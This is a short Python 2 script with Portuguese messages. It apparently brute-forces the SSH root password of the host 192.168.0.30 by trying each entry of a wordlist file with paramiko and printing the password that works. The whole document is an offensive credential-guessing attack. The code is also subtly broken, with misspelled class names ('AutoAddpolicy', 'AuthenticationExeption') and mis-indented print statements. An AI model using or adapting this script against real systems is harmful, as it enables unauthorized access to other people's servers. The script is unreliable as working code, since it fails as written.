#!/usr/bin/python 
import paramiko

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddpolicy())

f = open('lista.txt')
for palavra in f.readlines():
    senha = palavra.strip()

    try:
     ssh.connect('192.168.0.30', username='root', password=senha)

    except paramiko.ssh_exception.AuthenticationExeption:
    print "Testando com", senha

    else: 
    
    print "[+] A Senha foi Encontada ------->", senha 
        
    break
ssh.close()
